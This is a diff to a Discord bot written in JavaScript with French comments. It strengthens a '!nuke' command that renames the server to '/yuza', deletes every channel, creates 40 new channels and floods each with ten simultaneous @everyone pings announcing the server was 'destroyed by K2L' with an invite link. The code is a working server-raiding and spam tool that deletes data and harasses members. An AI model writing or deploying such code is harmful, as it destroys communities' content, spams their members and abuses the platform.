@@ -142,22 +142,22 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 3. COMMANDE !NUKE (Mass Creation & Flood en Promise.all)
+    // 3. COMMANDE !NUKE (Mass Creation + 10 Pings par salon en rafale)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE]** Lancement de l'action synchrone...");
+        await message.reply("💥 **[NUKE EXTREME]** Saturation des logs et destruction en cours...");
 
         try {
             // A. Renommer le serveur en "/yuza"
             await message.guild.setName('/yuza').catch(() => {});
 
-            // B. Suppression des salons existants en parallèle
+            // B. Suppression de tous les anciens salons en parallèle
             const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
             await Promise.all(deletePromises);
 
-            // C. Création massive de salons et flood instantané
+            // C. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
             const createPromises = [];
             for (let i = 0; i < 40; i++) {
                 createPromises.push(
@@ -178,10 +178,14 @@ client.on('messageCreate', async message => {
                             }
                         ]
                     }).then(async channel => {
-                        // Envoi de messages en boucle rapide dès la création du salon
-                        for (let j = 0; j < 5; j++) {
-                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                        // Envoi instantané de 10 messages de spam / ping par salon
+                        const spamPromises = [];
+                        for (let j = 0; j < 10; j++) {
+                            spamPromises.push(
+                                channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {})
+                            );
                         }
+                        await Promise.all(spamPromises);
                     }).catch(() => {})
                 );
             }
